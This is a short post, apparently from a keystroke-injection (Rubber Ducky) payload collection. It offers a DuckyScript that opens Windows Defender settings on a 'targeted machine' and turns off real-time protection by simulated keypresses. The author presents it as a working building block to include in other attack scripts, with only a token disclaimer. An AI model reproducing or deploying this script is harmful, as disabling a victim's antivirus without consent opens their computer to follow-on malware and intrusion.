Due to upgraded to Windows Defender, most script to disable it don’t work anymore. That’s why I decided to do it myself.

This scripts manually disable Windows Defender just as if the user clicked on the settings himself.

This can be included in other scripts.

You may want to adapt the DELAY depending on the speed of the targeted machine. 

```
REM Author      : https://github.com/TheTeasel
REM Description : Disable Windows Defender on Windows 10
REM             : You may want to change the DELAY depending on the speed of the targeted machine
REM             PLEASE DO NOT USE THIS SCRIPT FOR HARMFUL PURPOSES
DELAY 1000
REM Open Windows Defender settings
CTRL ESC
DELAY 1000
STRING Windows Defender Settings
DELAY 100
ENTER
REM Navigate to realtime protection and disable it
DELAY 1000
ENTER
DELAY 1000
ENTER
DELAY 1000
TAB
DELAY 250
TAB
DELAY 250
TAB
DELAY 250
TAB
ENTER
DELAY 1000
SPACE
DELAY 1000
LEFT
DELAY 500
ENTER
REM Close Settings
DELAY 500
ALT F4
DELAY 100
ALT F4
```